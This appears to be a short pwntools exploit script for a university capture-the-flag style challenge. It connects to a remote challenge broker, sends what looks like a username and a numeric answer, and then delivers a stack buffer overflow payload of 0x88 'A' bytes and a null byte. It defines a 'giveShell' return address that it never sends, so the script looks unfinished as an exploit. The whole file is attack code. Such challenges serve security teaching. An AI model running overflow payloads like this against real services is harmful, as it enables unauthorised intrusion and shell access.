from pwn import *
giveShell = p64(0x400afd)

query = ("A" * 0x88+ chr(0))
print(query)


p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1340)
print(p.recvuntil(":"))
p.sendline("joe215")
print(p.recvuntil("?"))
p.sendline("137")
print(p.recvuntil("data"))
print(query)
p.sendline(query)
print(p.recvall())
